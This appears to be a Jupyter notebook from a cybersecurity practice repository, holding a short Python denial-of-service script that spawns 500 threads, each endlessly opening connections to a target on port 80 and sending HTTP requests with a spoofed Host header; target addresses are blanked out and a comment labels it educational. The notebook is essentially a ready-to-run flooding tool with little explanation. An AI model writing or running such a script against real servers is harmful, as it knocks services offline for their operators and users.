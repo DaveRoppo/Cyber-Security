{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "6e2445a9",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "500\n",
      "1000\n"
     ]
    }
   ],
   "source": [
    "# DISCLAIMER: THIS EXAMPLE DDOS ATTACK SCRIPT IS FOR EDUCATIONAL PURPOSES ONLY\n",
    "\n",
    "# Import librariers\n",
    "# Socket to connect, and threading for running simulated multithreading\n",
    "\n",
    "import threading\n",
    "import socket\n",
    "\n",
    "# Define variables\n",
    "\n",
    "# Define desired target IP address\n",
    "target = 'xxx.xxx.x.x'\n",
    "# Define desired port \n",
    "port = 80\n",
    "#Define fake IP source address for the attack\n",
    "fake_ip = 'xxx.xx.x.x'\n",
    "\n",
    "connections = 0\n",
    "\n",
    "# Define the while loop for the attack \n",
    "\n",
    "def attack():\n",
    "    while True:\n",
    "        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n",
    "        s.connect((target, port))\n",
    "        s.sendto((\"GET /\" + target + \" HTTP/1.1\\r\\n\").encode('ascii'), (target, port))\n",
    "        s.sendto((\"Host: \" + fake_ip + \"r\\n\\r\\n\").encode('ascii'), (target, port))\n",
    "        s.close()\n",
    "        \n",
    "        #Print every 500 connections \n",
    "        global connections\n",
    "        connections += 1\n",
    "        if connections % 500 == 0:\n",
    "            print(connections)\n",
    "        \n",
    "for i in range(500):\n",
    "    thread = threading.Thread(target=attack) \n",
    "    thread.start()\n",
    "        "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "26b98ccd",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "acd19501",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
